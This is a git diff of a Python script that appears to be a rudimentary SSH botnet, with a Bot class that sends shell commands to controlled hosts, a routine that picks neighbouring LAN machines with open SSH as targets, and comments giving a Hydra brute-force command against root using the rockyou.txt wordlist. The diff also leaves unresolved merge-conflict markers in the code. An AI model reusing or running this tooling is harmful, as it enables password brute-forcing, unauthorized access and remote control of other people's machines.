@@ -5,7 +5,12 @@ import re
 import get_lan_ip
 import getpass
 
+<<<<<<< HEAD
+=======
+
+>>>>>>> 4c0309d1ca52337d530091092493a5bf4de6f4b7
 class Bot:
+
     def __init__(self, host, user, password):
         self.user = user
         self.password = password
@@ -32,11 +37,13 @@ def command_bots(command):
         attack = bot.send_command(command)
         print('Output from ' + bot.host)
         print(attack)
+
 #get target machine
 def targets():
     neighbors = get_neighbor()
     known_host = [b.host for b in botnet]
     return list(set(neighbors)-set(known_host))
+
 #ssh open
 #netcat -zv host port(22)
 def get_neighbor():
@@ -53,6 +60,7 @@ def get_neighbor():
             continue
         neighbors.append(ip)
     return neighbors
+
 #sudo apt-get install hydra hydra-gtk
 #hydra -l root -P rockyou.txt -t 4 ip
 def hydra(hosts):
@@ -68,7 +76,7 @@ botnet = []
 def add_bot(host, user, password):
     new_bot = Bot(host, user, password)
     botnet.append(new_bot)
-local_lan_ip = get_lan_ip
-user = subprocess.check_output(['whoami'])
+#local_lan_ip = get_lan_ip
+#user = subprocess.check_output(['whoami'])
 add_bot('ip','user','password')
 command_bots('ls')
